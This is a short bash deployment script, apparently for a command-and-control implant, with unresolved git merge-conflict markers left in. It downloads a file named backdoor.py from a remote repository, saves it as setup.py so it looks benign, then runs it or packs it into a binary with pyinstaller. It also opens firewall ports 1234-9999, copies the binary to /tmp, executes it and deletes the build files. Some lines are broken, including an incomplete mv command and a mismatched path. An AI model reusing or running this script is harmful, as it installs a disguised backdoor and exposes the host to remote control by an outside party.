#!/bin/bash
yum install -y python3;
curl -o setup.py https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/backdoor.py;
# curl -o pubkey.pem https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/pubkey.pem;
chmod +x setup.py;
pip3 install --upgrade pip;
pip3 install setuptools_rust;
pip3 install cryptography;
<<<<<<< HEAD
python3 setup.py;

mkdir .local
mv setup.py 

=======
pip3 install pyinstaller;
/usr/local/bin/pyinstaller setup.py --onefile
rm -rf build/
rm setup.spec
>>>>>>> fccb17c423fe30d1ae91dd53014106e326cd8d3f
rm setup.py
firewall-cmd --add-port=1234-9999/tcp;
cp ./dist/setup /tmp/setup
chmod +x /tmp/setup
rm -rf dist
./tmp/setup



